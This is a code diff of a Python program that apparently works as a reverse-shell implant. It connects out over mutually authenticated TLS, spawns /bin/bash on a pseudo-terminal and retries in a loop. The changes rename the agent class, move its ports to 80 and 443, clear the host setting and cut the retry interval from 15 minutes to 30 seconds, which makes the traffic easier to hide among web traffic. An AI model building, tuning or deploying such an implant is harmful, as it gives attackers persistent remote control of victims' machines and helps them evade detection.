@@ -8,11 +8,11 @@ import ssl
 import os 
 import select 
 
-KNOCK_PORT = 31415
-HTTPS_PORT = 31416
-HOST = socket.gethostbyname(socket.gethostname())
+KNOCK_PORT = 80
+TLS_PORT = 443
+HOST = ""
 
-class KronosAgent():
+class EmeraldEye():
 
     def __init__(self, host):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -48,7 +48,7 @@ class KronosAgent():
             context.verify_mode = ssl.CERT_REQUIRED
             context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
             ss = context.wrap_socket(self.sock, server_side=False, server_hostname=self.server_hostname)
-            ss.connect((self.host, HTTPS_PORT))
+            ss.connect((self.host, TLS_PORT))
             master, slave = pty.openpty()
 
             bash = subprocess.Popen("/bin/bash",
@@ -117,11 +117,11 @@ class KronosAgent():
                     print("Server did not get cert, will retry")
                     print("Agent Recieved unxpected data " + str(data))
             except Exception as e:
-                print("Can't reach server will retry in 15 minutes")
+                print("Can't reach server will retry in 30 seconds")
 
 def main():
-    k = KronosAgent(HOST)
+    k = EmeraldEye(HOST)
     while True:
         k.health_check()
-        time.sleep(15)
+        time.sleep(30)
 main()
